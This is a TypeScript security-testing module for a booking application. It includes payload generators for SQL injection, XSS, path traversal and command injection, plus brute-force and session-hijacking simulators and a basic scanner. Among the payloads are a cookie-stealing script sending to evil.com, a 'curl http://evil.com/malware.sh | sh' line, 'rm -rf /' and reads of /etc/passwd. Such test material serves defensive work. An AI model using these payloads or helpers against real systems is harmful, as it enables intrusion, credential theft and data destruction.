// Security Testing Utilities
// Utilidades para testing de seguridad

// Import necessary types
import type { CreateBookingData } from '../../types';

// Types específicos para security testing
interface SecurityTestBookingData {
  name: string;
  email: string;
  phone: string;
  company: string;
  studio_space: string;
  package_duration: string;
  preferred_date: string;
  preferred_time: string;
  participants: number;
  session_type: string;
  notes: string;
  total_price: number;
}

interface SecurityTestValidationResult {
  isValid: boolean;
  errors: string[];
  warnings?: string[];
}

interface SecurityTestAttempt {
  attempt: number;
  success: boolean;
  response: any;
}

// =============================================================================
// ATTACK VECTOR GENERATORS
// =============================================================================

export class AttackVectorGenerator {
  // SQL Injection payloads
  static getSQLInjectionPayloads(): string[] {
    return [
      "'; DROP TABLE bookings; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "1; DELETE FROM bookings WHERE 1=1 --",
      "' OR 1=1 LIMIT 1 OFFSET 1 --",
      "'; INSERT INTO bookings (name) VALUES ('hacked'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' OR SLEEP(5) --",
      "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --"
    ];
  }

  // XSS payloads
  static getXSSPayloads(): string[] {
    return [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')></iframe>",
      "'-alert('XSS')-'",
      "\"><script>alert('XSS')</script>",
      "<script>document.location='http://evil.com/'+document.cookie</script>",
      "<body onload=alert('XSS')>",
      "<<SCRIPT>alert('XSS')//<</SCRIPT>"
    ];
  }

  // CSRF tokens (intentionally invalid)
  static getInvalidCSRFTokens(): string[] {
    return [
      "",
      "invalid-token",
      "null",
      "undefined",
      "expired-token-123",
      "{'token': 'fake'}",
      "../../../etc/passwd",
      "javascript:void(0)"
    ];
  }

  // Directory traversal payloads
  static getDirectoryTraversalPayloads(): string[] {
    return [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "../../../../../../../../../../etc/passwd%00",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ];
  }

  // Command injection payloads
  static getCommandInjectionPayloads(): string[] {
    return [
      "; ls -la",
      "| cat /etc/passwd",
      "&& whoami",
      "`id`",
      "$(whoami)",
      "; rm -rf /",
      "| nc -l 4444",
      "&& curl http://evil.com/malware.sh | sh"
    ];
  }
}

// =============================================================================
// SECURITY ASSERTION HELPERS
// =============================================================================

export class SecurityAssertions {
  // Verify no sensitive data in response
  static assertNoSensitiveDataExposed(response: any): void {
    const sensitivePatterns = [
      /"password".*:/i,
      /"secret".*:/i,
      /"token".*:/i,
      /"key".*:/i,
      /"private".*:/i,
      /"confidential".*:/i,
      /"internal".*:/i,
      /"admin".*:/i,
      /"root".*:/i,
      /"database".*:/i,
      /"connection".*:/i,
      // Solo detectar config si es una clave de objeto JSON, no en URLs
      /"config".*:/i
    ];

    const responseStr = JSON.stringify(response);
    
    sensitivePatterns.forEach(pattern => {
      if (pattern.test(responseStr)) {
        throw new Error(`Sensitive data potentially exposed: ${pattern}`);
      }
    });
  }

  // Verify proper error messages (no information disclosure)
  static assertSecureErrorMessage(errorMessage: string): void {
    const dangerousPatterns = [
      /database/i,
      /sql/i,
      /table/i,
      /column/i,
      /connection/i,
      /server/i,
      /internal/i,
      /stack trace/i,
      /line \d+/i,
      /file.*\.js/i,
      /error.*at.*\(/i
    ];

    dangerousPatterns.forEach(pattern => {
      if (pattern.test(errorMessage)) {
        throw new Error(`Information disclosure in error message: ${pattern}`);
      }
    });
  }

  // Verify response headers contain security headers
  static assertSecurityHeaders(headers: Headers): void {
    const requiredHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection',
      'strict-transport-security'
    ];

    requiredHeaders.forEach(header => {
      if (!headers.get(header)) {
        throw new Error(`Missing security header: ${header}`);
      }
    });
  }

  // Verify password complexity
  static assertPasswordComplexity(password: string): void {
    const requirements = [
      { pattern: /.{8,}/, message: "Password must be at least 8 characters" },
      { pattern: /[A-Z]/, message: "Password must contain uppercase letter" },
      { pattern: /[a-z]/, message: "Password must contain lowercase letter" },
      { pattern: /[0-9]/, message: "Password must contain number" },
      { pattern: /[^A-Za-z0-9]/, message: "Password must contain special character" }
    ];

    requirements.forEach(req => {
      if (!req.pattern.test(password)) {
        throw new Error(req.message);
      }
    });
  }
}

// =============================================================================
// MOCK ATTACK SIMULATION
// =============================================================================

export class AttackSimulator {
  // Simulate brute force attack
  static async simulateBruteForceAttack(
    endpoint: string,
    credentials: Array<{email: string, password: string}>,
    maxAttempts: number = 10
  ): Promise<SecurityTestAttempt[]> {
    const results: SecurityTestAttempt[] = [];
    
    for (let i = 0; i < Math.min(credentials.length, maxAttempts); i++) {
      try {
        const formData = new FormData();
        formData.append('email', credentials[i].email);
        formData.append('password', credentials[i].password);
        
        const response = await fetch(endpoint, {
          method: 'POST',
          body: formData
        });
        
        const result = await response.json();
        
        results.push({
          attempt: i + 1,
          success: response.ok,
          response: result
        });
        
        // Add delay to simulate real attack pattern
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (error) {
        results.push({
          attempt: i + 1,
          success: false,
          response: { error: error instanceof Error ? error.message : 'Unknown error' }
        });
      }
    }
    
    return results;
  }

  // Simulate concurrent requests (race condition testing)
  static async simulateConcurrentRequests(
    requestFunction: () => Promise<any>,
    concurrency: number = 10
  ): Promise<PromiseSettledResult<any>[]> {
    const promises = Array.from({ length: concurrency }, () => requestFunction());
    return await Promise.allSettled(promises);
  }

  // Simulate session hijacking attempt
  static async simulateSessionHijacking(
    sessionToken: string,
    targetEndpoint: string
  ): Promise<any> {
    try {
      const response = await fetch(targetEndpoint, {
        headers: {
          'Authorization': `Bearer ${sessionToken}`,
          'Cookie': `session=${sessionToken}`
        }
      });
      
      return {
        success: response.ok,
        status: response.status,
        data: await response.json()
      };
    } catch (error) {
      return {
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }
}

// =============================================================================
// VULNERABILITY SCANNERS
// =============================================================================

export class VulnerabilityScanner {
  // Scan for common web vulnerabilities
  static async scanCommonVulnerabilities(baseUrl: string): Promise<{
    sql_injection: boolean;
    xss: boolean;
    directory_traversal: boolean;
    command_injection: boolean;
    csrf: boolean;
  }> {
    const results = {
      sql_injection: false,
      xss: false,
      directory_traversal: false,
      command_injection: false,
      csrf: false
    };

    // Test SQL injection
    const sqlPayloads = AttackVectorGenerator.getSQLInjectionPayloads();
    for (const payload of sqlPayloads.slice(0, 3)) { // Test first 3 payloads
      try {
        const response = await fetch(`${baseUrl}/api/test?id=${encodeURIComponent(payload)}`);
        const text = await response.text();
        if (text.includes('SQL') || text.includes('database') || text.includes('syntax')) {
          results.sql_injection = true;
          break;
        }
      } catch (error) {
        // Expected for most payloads
      }
    }

    // Test XSS
    const xssPayloads = AttackVectorGenerator.getXSSPayloads();
    for (const payload of xssPayloads.slice(0, 3)) {
      try {
        const response = await fetch(`${baseUrl}/api/test?name=${encodeURIComponent(payload)}`);
        const text = await response.text();
        if (text.includes('<script>') || text.includes('javascript:')) {
          results.xss = true;
          break;
        }
      } catch (error) {
        // Expected for most payloads
      }
    }

    return results;
  }

  // Scan for information disclosure
  static async scanInformationDisclosure(endpoints: string[]): Promise<string[]> {
    const vulnerableEndpoints: string[] = [];
    
    for (const endpoint of endpoints) {
      try {
        const response = await fetch(endpoint);
        const text = await response.text();
        
        // Check for common information disclosure patterns
        const patterns = [
          /version:\s*[\d.]+/i,
          /server:\s*[^\s]+/i,
          /php.*error/i,
          /stack.*trace/i,
          /database.*error/i,
          /internal.*server/i
        ];
        
        if (patterns.some(pattern => pattern.test(text))) {
          vulnerableEndpoints.push(endpoint);
        }
      } catch (error) {
        // Endpoint might not exist, continue scanning
      }
    }
    
    return vulnerableEndpoints;
  }
}

// =============================================================================
// TEST DATA GENERATORS
// =============================================================================

export class TestDataGenerator {
  // Generate malicious booking data
  static generateMaliciousBookingData(): CreateBookingData[] {
    const sqlPayloads = AttackVectorGenerator.getSQLInjectionPayloads();
    const xssPayloads = AttackVectorGenerator.getXSSPayloads();
    
    return [
      // SQL injection in various fields
      {
        name: sqlPayloads[0],
        email: "test@example.com",
        phone: "+34600000000",
        company: "Test Company",
        studio_space: "Sala Principal",
        package_duration: "2 horas",
        preferred_date: "2024-12-01",
        preferred_time: "10:00",
        participants: 5,
        session_type: "Fotografía",
        notes: "Test booking",
        total_price: 100
      },
      // XSS in name field
      {
        name: xssPayloads[0],
        email: "test@example.com",
        phone: "+34600000000",
        company: "Test Company",
        studio_space: "Sala Principal",
        package_duration: "2 horas",
        preferred_date: "2024-12-01",
        preferred_time: "10:00",
        participants: 5,
        session_type: "Fotografía",
        notes: "Test booking",
        total_price: 100
      },
      // Command injection in notes
      {
        name: "Test User",
        email: "test@example.com",
        phone: "+34600000000",
        company: "Test Company",
        studio_space: "Sala Principal",
        package_duration: "2 horas",
        preferred_date: "2024-12-01",
        preferred_time: "10:00",
        participants: 5,
        session_type: "Fotografía",
        notes: AttackVectorGenerator.getCommandInjectionPayloads()[0],
        total_price: 100
      }
    ];
  }

  // Generate edge case data
  static generateEdgeCaseData(): Array<Partial<CreateBookingData>> {
    return [
      // Empty values
      { name: "", email: "", phone: "" },
      // Null values
      { name: null as any, email: null as any, phone: null as any },
      // Undefined values
      { name: undefined as any, email: undefined as any, phone: undefined as any },
      // Very long strings
      { 
        name: "A".repeat(10000),
        email: "test@" + "a".repeat(1000) + ".com",
        phone: "1".repeat(50)
      },
      // Special characters
      { 
        name: "🎭🎨📸",
        email: "test+special@example.com",
        phone: "+34-600-000-000"
      },
      // Unicode attacks
      {
        name: "\u0000\u0001\u0002",
        email: "test\u2028@example.com",
        phone: "+34\u202E600000000"
      }
    ];
  }

  // Generate stress test data
  static generateStressTestData(count: number): CreateBookingData[] {
    const data: CreateBookingData[] = [];
    
    for (let i = 0; i < count; i++) {
      data.push({
        name: `Stress Test User ${i}`,
        email: `stress${i}@example.com`,
        phone: `+346${String(i).padStart(8, '0')}`,
        company: `Test Company ${i}`,
        studio_space: "Sala Principal",
        package_duration: "2 horas",
        preferred_date: "2024-12-01",
        preferred_time: "10:00",
        participants: Math.floor(Math.random() * 10) + 1,
        session_type: "Fotografía",
        notes: `Stress test booking ${i}`,
        total_price: Math.floor(Math.random() * 500) + 50
      });
    }
    
    return data;
  }
}

// =============================================================================
// PERFORMANCE MONITORS
// =============================================================================

// Mock performance API for testing environment
const mockPerformance = {
  mark: () => {},
  measure: () => {},
  getEntriesByName: () => [{ duration: 100 }],
  now: () => Date.now(),
  clearMarks: () => {},
  clearMeasures: () => {}
};

// Ensure performance API is available
if (typeof globalThis !== 'undefined' && typeof globalThis.performance === 'undefined') {
  globalThis.performance = mockPerformance as any;
}

export class PerformanceMonitor {
  private static measurements: Map<string, number[]> = new Map();
  private static startTimes: Map<string, number> = new Map();

  // Start performance measurement
  static startMeasurement(operationName: string): string {
    const measurementId = `${operationName}_${Date.now()}_${Math.random()}`;
    const startTime = Date.now();
    this.startTimes.set(measurementId, startTime);
    
    try {
      performance.mark(`${measurementId}_start`);
    } catch (error) {
      // Fallback if performance API fails
      console.warn('Performance API not available, using fallback timing');
    }
    
    return measurementId;
  }

  // End performance measurement
  static endMeasurement(measurementId: string): number {
    const endTime = Date.now();
    const startTime = this.startTimes.get(measurementId) || endTime;
    let duration = endTime - startTime;
    
    try {
      performance.mark(`${measurementId}_end`);
      performance.measure(measurementId, `${measurementId}_start`, `${measurementId}_end`);
      
      const measure = performance.getEntriesByName(measurementId)[0];
      if (measure && measure.duration) {
        duration = measure.duration;
      }
    } catch (error) {
      // Use fallback timing if performance API fails
      console.warn('Performance API measure failed, using fallback timing');
    }
    
    // Store measurement
    const operationName = measurementId.split('_')[0];
    if (!this.measurements.has(operationName)) {
      this.measurements.set(operationName, []);
    }
    this.measurements.get(operationName)!.push(duration);
    
    // Clean up
    this.startTimes.delete(measurementId);
    
    return duration;
  }

  // Get performance statistics
  static getStatistics(operationName: string): {
    count: number;
    average: number;
    min: number;
    max: number;
    p95: number;
  } | null {
    const measurements = this.measurements.get(operationName);
    if (!measurements || measurements.length === 0) {
      return null;
    }

    const sorted = [...measurements].sort((a, b) => a - b);
    const count = sorted.length;
    const sum = sorted.reduce((a, b) => a + b, 0);
    
    return {
      count,
      average: sum / count,
      min: sorted[0],
      max: sorted[count - 1],
      p95: sorted[Math.floor(count * 0.95)]
    };
  }

  // Assert performance thresholds
  static assertPerformanceThreshold(operationName: string, maxDuration: number): void {
    const stats = this.getStatistics(operationName);
    if (!stats) {
      throw new Error(`No measurements found for operation: ${operationName}`);
    }

    if (stats.average > maxDuration) {
      throw new Error(
        `Performance threshold exceeded for ${operationName}: ` +
        `average ${stats.average}ms > threshold ${maxDuration}ms`
      );
    }
  }

  // Clear all measurements
  static clearMeasurements(): void {
    this.measurements.clear();
    if (typeof performance !== 'undefined' && performance.clearMarks) {
      performance.clearMarks();
    }
    if (typeof performance !== 'undefined' && performance.clearMeasures) {
      performance.clearMeasures();
    }
  }
}